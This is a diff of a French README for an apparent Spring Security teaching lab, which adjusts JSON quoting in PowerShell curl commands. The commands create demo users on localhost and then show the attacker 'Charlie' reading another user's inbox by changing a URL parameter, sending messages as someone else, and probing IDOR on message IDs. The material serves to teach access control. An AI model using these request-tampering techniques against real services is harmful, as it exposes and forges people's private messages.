@@ -47,11 +47,11 @@ Ce dossier présente différents niveaux d'implémentation du contrôle d'accès
 On va inscrire 3 utilisateurs (Bob, Alice, Charlie) et envoyer des messages privés entre eux pour avoir des données à exploiter.
 
 ```powershell
-curl.exe -c cookies_bob.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"bob\", \"motDePasse\": \"MotDePasse123!\"}'
-curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"charlie\", \"motDePasse\": \"MotDePasse123!\"}'
-curl.exe -c cookies_alice.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"alice\", \"motDePasse\": \"MotDePasse123!\"}'
-curl.exe -b cookies_bob.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{\"expediteur\": \"bob\", \"destinataire\": \"alice\", \"contenu\": \"Salut Alice, on se voit ce soir pour Netflix and chill, ma femme a son club lecture?\"}'
-curl.exe -b cookies_alice.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{\"expediteur\": \"alice\", \"destinataire\": \"bob\", \"contenu\": \"Ou la la! CT chaud caliente hier soir? Pas trop de problème avec ta femme!!\"}'
+curl.exe -c cookies_bob.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{"nomUtilisateur": "bob", "motDePasse": "MotDePasse123!"}'
+curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{"nomUtilisateur": "charlie", "motDePasse": "MotDePasse123!"}'
+curl.exe -c cookies_alice.txt -X POST http://localhost:8080/api/id/signup -H "Content-Type: application/json" -d '{"nomUtilisateur": "alice", "motDePasse": "MotDePasse123!"}'
+curl.exe -b cookies_bob.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{"expediteur": "bob", "destinataire": "alice", "contenu": "Salut Alice, on se voit ce soir pour Netflix and chill, ma femme a son club lecture?"}'
+curl.exe -b cookies_alice.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{"expediteur": "alice", "destinataire": "bob", "contenu": "Ou la la! CT chaud caliente hier soir? Pas trop de problème avec ta femme!!"}'
 curl.exe -b cookies_alice.txt -X GET http://localhost:8080/api/messages?utilisateur=alice 
 ```
 
@@ -67,19 +67,19 @@ curl.exe "http://localhost:8080/api/messages?utilisateur=bob"
 #### 02-SpringSecurityBasic — Identité basée sur le paramètre requête
 ```powershell
 # Se connecter en tant que Charlie
-curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"charlie\", \"motDePasse\": \"MotDePasse123!\"}'
+curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{"nomUtilisateur": "charlie", "motDePasse": "MotDePasse123!"}'
 
 # Charlie lit la boîte de Bob en changeant le paramètre URL
 curl.exe -b cookies_charlie.txt "http://localhost:8080/api/messages?utilisateur=bob"
 
 # Charlie envoie un message en se faisant passer pour Alice
-curl.exe -b cookies_charlie.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{\"expediteur\": \"alice\", \"destinataire\": \"bob\", \"contenu\": \"Tout est fini entre nous lol!!!\"}'
+curl.exe -b cookies_charlie.txt -X POST http://localhost:8080/api/messages -H "Content-Type: application/json" -d '{"expediteur": "alice", "destinataire": "bob", "contenu": "Tout est fini entre nous lol!!!"}'
 ```
 
 #### 03-SpringSecurityAuth — IDOR (Insecure Direct Object Reference)
 ```powershell
 # Se connecter en tant que Charlie
-curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"charlie\", \"motDePasse\": \"MotDePasse123!\"}'
+curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{"nomUtilisateur": "charlie", "motDePasse": "MotDePasse123!"}'
 
 # La boîte de réception est correcte — Charlie ne voit que ses messages
 curl.exe -b cookies_charlie.txt http://localhost:8080/api/messages
@@ -94,7 +94,7 @@ Tous les exploits précédents sont corrigés.
 
 ```powershell
 # Se connecter en tant que Charlie
-curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{\"nomUtilisateur\": \"charlie\", \"motDePasse\": \"MotDePasse123!\"}'
+curl.exe -c cookies_charlie.txt -X POST http://localhost:8080/api/id/signin -H "Content-Type: application/json" -d '{"nomUtilisateur": "charlie", "motDePasse": "MotDePasse123!"}'
 
 # Charlie tente de lire le message privé Alice→Bob
 curl.exe -b cookies_charlie.txt http://localhost:8080/api/messages/1
